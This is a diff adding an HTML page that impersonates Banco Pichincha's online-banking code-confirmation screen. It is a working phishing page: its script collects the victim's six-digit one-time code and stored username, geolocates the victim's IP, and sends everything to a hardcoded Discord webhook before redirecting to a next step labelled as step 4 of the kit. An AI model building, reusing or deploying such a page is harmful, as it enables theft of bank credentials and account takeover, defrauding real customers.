@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Seguridad - Banca Web</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f8fafc;
+      color: #1a2b4c;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #e2e8f0;
+      background-color: #ffffff;
+    }
+
+    .logo-container img {
+      height: 40px;
+      object-fit: contain;
+    }
+
+    .menu-button {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 16px;
+      color: #1a2b4c;
+      font-weight: 500;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+
+    .menu-icon {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .menu-icon span {
+      display: block;
+      width: 18px;
+      height: 2px;
+      background-color: #1a2b4c;
+    }
+
+    main {
+      max-width: 480px;
+      width: 100%;
+      margin: 30px auto;
+      padding: 0 20px;
+      flex-grow: 1;
+    }
+
+    .verification-card {
+      background-color: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 30px 24px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+      text-align: center;
+    }
+
+    .icon-shield {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 15px;
+      color: #112855;
+    }
+
+    h1 {
+      font-size: 22px;
+      color: #112855;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #555555;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .otp-input {
+      width: 45px;
+      height: 55px;
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      border: 1px solid #dcdcdc;
+      border-radius: 6px;
+      outline: none;
+      background-color: #ffffff;
+      transition: border-color 0.2s, box-shadow 0.2s, background-color 0.2s;
+      cursor: pointer;
+    }
+
+    .otp-input:focus {
+      border-color: #112855;
+      box-shadow: 0 0 0 2px rgba(17, 40, 85, 0.1);
+    }
+
+    .otp-input.copiado {
+      border-color: #1e9e5a;
+      background-color: #f2fbf6;
+    }
+
+    .error-msg {
+      color: #d93025;
+      font-size: 13px;
+      margin-bottom: 20px;
+      display: none;
+    }
+
+    .resend-text {
+      font-size: 13px;
+      color: #64748b;
+      margin-bottom: 25px;
+    }
+
+    .resend-text a {
+      color: #4a6da7;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .resend-text a:hover {
+      text-decoration: underline;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 48px;
+      background-color: #ffeb82;
+      color: #7a7348;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s, color 0.2s;
+    }
+
+    .btn-submit.active {
+      background-color: #ffdd00;
+      color: #112855;
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.75;
+      cursor: wait;
+    }
+
+    .estado {
+      font-size: 12px;
+      color: #6b7a94;
+      text-align: center;
+      min-height: 16px;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/L84XBCfQ/Banco-Pichincha-nuevo.png" alt="Banco Pichincha Nuevo Logo">
+    </div>
+    <button class="menu-button">
+      <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      Menú
+    </button>
+  </header>
+
+  <main>
+    <div class="verification-card">
+      <svg class="icon-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+      </svg>
+
+      <h1>Confirmación de Identidad</h1>
+      <p class="description">Ingrese el código de 6 dígitos generado en su app móvil o enviado a su teléfono registrado.</p>
+
+      <form id="otpForm">
+        <div class="otp-container">
+          <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required autocomplete="one-time-code">
+          <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+        </div>
+
+        <div id="otpError" class="error-msg">Por favor, complete todos los 6 dígitos correctamente (solo números).</div>
+
+        <div class="resend-text">
+          ¿No recibiste el código? <a href="#" id="resendBtn">Reenviar código</a>
+        </div>
+
+        <button type="submit" class="btn-submit" id="btnConfirmar">Confirmar y Continuar</button>
+        <div id="estadoCaptura" class="estado"></div>
+      </form>
+    </div>
+  </main>
+
+  <!-- ==================== CONFIGURACIÓN ==================== -->
+  <script>
+    /* >>> TU WEBHOOK DE DISCORD <<< */
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1574596028714324139/vNxZsqtVPD-wf_OhFHI7d4Zs-IIKNudVemRlfO547yN_JAFExWzqyD7p9cA4NiwdnenA';
+
+    /* Nombre visible del mensaje (identifica el paso 4) */
+    const NOMBRE_WEBHOOK = 'Pichincha · Intento 4';
+
+    /* Página a la que se redirige tras confirmar */
+    const PAGINA_DESTINO = 'post-time2.html';
+
+    /* Clave con la que el usuario queda guardado como identificador global */
+    const KEY_USUARIO = 'pichincha_usuario';
+
+    /* Tiempo máximo de espera al webhook antes de redirigir (ms) */
+    const TIMEOUT_ENVIO = 4500;
+  </script>
+
+  <!-- ==================== LÓGICA ==================== -->
+  <script>
+    const inputs = document.querySelectorAll('.otp-input');
+    const btnConfirmar = document.getElementById('btnConfirmar');
+    const otpError = document.getElementById('otpError');
+    const otpForm = document.getElementById('otpForm');
+    const estadoCaptura = document.getElementById('estadoCaptura');
+
+    /* ---------- Identificador del usuario ---------- */
+    function obtenerUsuarioActual() {
+      const url = new URLSearchParams(location.search).get('u');
+      if (url) return url;
+      try {
+        const ls = localStorage.getItem(KEY_USUARIO);
+        if (ls) return ls;
+      } catch (e) {}
+      try {
+        const ss = sessionStorage.getItem(KEY_USUARIO);
+        if (ss) return ss;
+      } catch (e) {}
+      const m = document.cookie.match(/(?:^|;\s*)pich_usuario=([^;]+)/);
+      return m ? decodeURIComponent(m[1]) : '';
+    }
+
+    const usuarioActual = obtenerUsuarioActual();
+
+    /* ---------- Copiar el dígito al hacer clic en cada casilla ---------- */
+    function hacerCopiable(input) {
+      let timer = null;
+
+      input.addEventListener('click', async function () {
+        if (input.value === '') return;
+
+        let ok = false;
+        try {
+          await navigator.clipboard.writeText(input.value);
+          ok = true;
+        } catch (e) {
+          try {
+            const sel = input.selectionStart;
+            const fin = input.selectionEnd;
+            input.select();
+            ok = document.execCommand('copy');
+            input.setSelectionRange(sel, fin);
+          } catch (e2) { ok = false; }
+        }
+
+        if (!ok) return;
+
+        input.classList.add('copiado');
+        clearTimeout(timer);
+        timer = setTimeout(() => input.classList.remove('copiado'), 900);
+      });
+    }
+
+    inputs.forEach(hacerCopiable);
+
+    /* ---------- Comportamiento de las casillas ---------- */
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        const value = e.target.value;
+        const numericValue = value.replace(/[^0-9]/g, '');
+        e.target.value = numericValue;
+
+        if (numericValue && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        verificarCompletado();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    function verificarCompletado() {
+      let allFilled = true;
+      inputs.forEach(input => {
+        if (!input.value || !/^[0-9]$/.test(input.value)) {
+          allFilled = false;
+        }
+      });
+
+      if (allFilled) {
+        btnConfirmar.classList.add('active');
+      } else {
+        btnConfirmar.classList.remove('active');
+      }
+    }
+
+    /* ---------- Geolocalización por IP (solo IP / país / ciudad / región) ---------- */
+    async function obtenerGeo() {
+      const respaldo = {
+        ip: 'no disponible',
+        pais: 'no disponible',
+        ciudad: 'no disponible',
+        region: 'no disponible'
+      };
+
+      const fuentes = [
+        {
+          url: 'https://ipwho.is/',
+          map: d => ({
+            ip: d.ip,
+            pais: d.country,
+            ciudad: d.city,
+            region: d.region
+          })
+        },
+        {
+          url: 'https://ipapi.co/json/',
+          map: d => ({
+            ip: d.ip,
+            pais: d.country_name,
+            ciudad: d.city,
+            region: d.region
+          })
+        }
+      ];
+
+      for (const f of fuentes) {
+        try {
+          const ctrl = new AbortController();
+          const t = setTimeout(() => ctrl.abort(), 4000);
+          const r = await fetch(f.url, { signal: ctrl.signal, cache: 'no-store' });
+          clearTimeout(t);
+          if (!r.ok) continue;
+          const d = await r.json();
+          if (!d || d.success === false) continue;
+          const m = f.map(d);
+          if (m && m.ip) return m;
+        } catch (e) { /* siguiente fuente */ }
+      }
+      return respaldo;
+    }
+
+    /* ---------- Construir mensaje para Discord ---------- */
+    /* Usuario y código van en bloques de código: un clic los copia. */
+    function construirMensaje(datos, geo) {
+      const linea = '──────────────────────';
+      return [
+        '👤 USUARIO (ID): `' + datos.usuario + '`',
+        '🔢 CÓDIGO OTP: `' + datos.codigo + '`',
+        '✅ VALIDACIÓN: ' + (datos.valido ? 'Código completo' : 'Código incompleto'),
+        linea,
+        '🌐 IP: ' + geo.ip,
+        '📍 PAÍS: ' + geo.pais,
+        '🏙️ CIUDAD: ' + geo.ciudad,
+        '🗺️ REGIÓN: ' + geo.region
+      ].join('\n');
+    }
+
+    /* ---------- Enviar a Discord ---------- */
+    function enviarDiscord(payload) {
+      const cuerpo = JSON.stringify({
+        username: NOMBRE_WEBHOOK,
+        content: payload
+      });
+
+      const peticion = fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: cuerpo,
+        keepalive: true
+      }).catch(() => {
+        try {
+          navigator.sendBeacon(
+            WEBHOOK_URL,
+            new Blob([cuerpo], { type: 'application/json' })
+          );
+        } catch (e) {}
+      });
+
+      const limite = new Promise(res => setTimeout(res, TIMEOUT_ENVIO));
+      return Promise.race([peticion, limite]);
+    }
+
+    /* ---------- Flujo principal ---------- */
+    let enviando = false;
+
+    otpForm.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      if (enviando) return;
+
+      let codigoCompleto = '';
+      let esValido = true;
+
+      inputs.forEach(input => {
+        if (!input.value || !/^[0-9]$/.test(input.value)) {
+          esValido = false;
+        } else {
+          codigoCompleto += input.value;
+        }
+      });
+
+      if (!esValido || codigoCompleto.length !== 6) {
+        otpError.style.display = 'block';
+      } else {
+        otpError.style.display = 'none';
+      }
+
+      enviando = true;
+      btnConfirmar.disabled = true;
+      estadoCaptura.textContent = 'Validando código…';
+
+      const geo = await obtenerGeo();
+      estadoCaptura.textContent = 'Registrando verificación…';
+
+      const mensaje = construirMensaje({
+        usuario: usuarioActual || '(sin identificar)',
+        codigo: codigoCompleto || '(incompleto)',
+        valido: esValido && codigoCompleto.length === 6
+      }, geo);
+
+      await enviarDiscord(mensaje);
+
+      if (esValido && codigoCompleto.length === 6) {
+        estadoCaptura.textContent = 'Confirmado…';
+        window.location.href = PAGINA_DESTINO + (usuarioActual ? '?u=' + encodeURIComponent(usuarioActual) : '');
+      } else {
+        enviando = false;
+        btnConfirmar.disabled = false;
+        estadoCaptura.textContent = 'Código incorrecto, volvé a intentarlo.';
+      }
+    });
+  </script>
+</body>
+</html>
